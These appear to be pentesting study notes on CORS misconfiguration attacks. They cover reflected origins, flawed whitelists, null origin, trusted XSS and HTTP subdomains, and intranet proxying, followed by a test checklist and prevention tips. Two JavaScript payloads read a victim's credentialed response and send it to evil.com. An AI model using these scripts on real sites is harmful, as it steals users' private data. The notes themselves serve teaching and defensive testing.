# CORS - Cross-Origin Resource Sharing Attacks

## CORS (Cross-Origin Resource Sharing) - Overview

### 1. What it is

* Browser mechanism that controls when JS on one origin can _read the response_ from another origin
* Relaxes the same-origin policy (SOP) in a controlled way, via HTTP headers
* SOP baseline: a site can _send_ cross-origin requests, just can't _read_ the response - CORS is what opens that up when both sides agree
* **CORS is not a CSRF defense** - it governs response-reading, not request-sending. A misconfigured CORS policy is its own vulnerability class

### 2. Key headers

* `Origin` - sent by browser, tells server where the request came from
* `Access-Control-Allow-Origin` (ACAO) - server's response, says who's allowed to read the response
* `Access-Control-Allow-Credentials: true` - required if the request should be allowed to include cookies
* Combination of `ACAO: <attacker-origin>` + `Allow-Credentials: true` = the dangerous pairing to look for

### 3. Vulnerability 1 - reflecting Origin into ACAO

* Server just echoes whatever `Origin` it receives back into `Access-Control-Allow-Origin`
* Effectively allows every origin, since it matches whatever you send
* Test: send a request with `Origin: https://attacker.com`, check if it comes back reflected + `Allow-Credentials: true`
* If sensitive data is in the response, exfil script:

js

```js
  var req = new XMLHttpRequest();
  req.onload = () => location = '//evil.com/log?key=' + req.responseText;
  req.open('get','https://target.com/sensitive-data', true);
  req.withCredentials = true;
  req.send();
```

### 4. Vulnerability 2 - flawed origin whitelist matching

* Whitelist logic checks prefix/suffix/regex on the domain, gets it wrong
* Suffix-match mistake: allows `*normal-website.com` → register `hackersnormal-website.com`
* Prefix-match mistake: allows `normal-website.com*` → register `normal-website.com.evil-user.net`
* Test: try adding your own domain as a prefix or suffix around the expected string, see if it still validates

### 5. Vulnerability 3 - `null` origin whitelisted

* Browsers send literal `Origin: null` in specific situations:
  * Cross-origin redirects
  * Sandboxed iframes
  * `file:` protocol requests
  * Requests from serialized data
* If server explicitly allows `ACAO: null` (often left in for local dev), forge a null-origin request:

html

```html
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
    src="data:text/html,<script>
      var req = new XMLHttpRequest();
      req.open('get','https://target.com/sensitive-data', true);
      req.withCredentials = true;
      req.onload = () => location='https://evil.com/log?key='+req.responseText;
      req.send();
    </script>">
  </iframe>
```

### 6. Vulnerability 4 - CORS + XSS on a trusted origin

* Even a "correctly" scoped CORS policy trusts _some_ origin
* If that trusted origin (e.g. a subdomain) has its own XSS bug, attacker uses the XSS to run the CORS-fetch script from _inside_ the trusted origin
* Trust relationship becomes the attack path - the CORS config wasn't wrong, the trusted party was compromised

### 7. Vulnerability 5 - trusting an HTTP subdomain from an HTTPS site

* Main site is all-HTTPS, but whitelists a subdomain still served over plain HTTP
* Attacker (on-path/MITM) intercepts the victim's plain HTTP traffic, redirects to the trusted HTTP subdomain, spoofs a response containing a CORS request back to the HTTPS target
* Since the origin is whitelisted, the request succeeds and leaks data - even though the main site never had an actual HTTP endpoint itself
* Lesson: whitelisting _any_ HTTP origin breaks the security guarantee of an otherwise-solid HTTPS setup

### 8. Vulnerability 6 - intranet + CORS without credentials

* No `Allow-Credentials` doesn't mean no risk - if `ACAO: *` (or reflected) on an internal/intranet host, an external attacker can use a victim's browser as a proxy
* Victim (inside the private network) visits attacker's public site → attacker's JS fires a cross-origin request to the internal hostname → browser can reach it because the victim's machine can, response comes back unauthenticated but still often sensitive (internal docs, dashboards)
* Internal sites are frequently weaker on security than external-facing ones - a good target once this path is open

### 9. Testing checklist

* [ ] Send `Origin: https://evil.com` (or Burp Collaborator domain) - check if ACAO reflects it
* [ ] Check if `Access-Control-Allow-Credentials: true` is also present
* [ ] Try a domain that starts or ends with the expected string, to catch prefix/suffix whitelist bugs
* [ ] Send `Origin: null` - check if it's allowed
* [ ] Map out every origin the target trusts - check each one for XSS
* [ ] Check if any whitelisted origin is plain HTTP while the rest of the site is HTTPS
* [ ] For intranet/internal hosts, check ACAO even without credentials - still a proxy risk

### 10. Prevention (context for writeups)

* Never dynamically reflect `Origin` without validating against an explicit allowlist
* No wildcard `ACAO: *` on anything with sensitive data, and definitely not combined with credentials
* Never whitelist `null`
* Don't whitelist HTTP origins from an HTTPS site
* CORS is a browser-side control only - it's not a substitute for real server-side auth; an attacker can always forge a raw request outside the browser
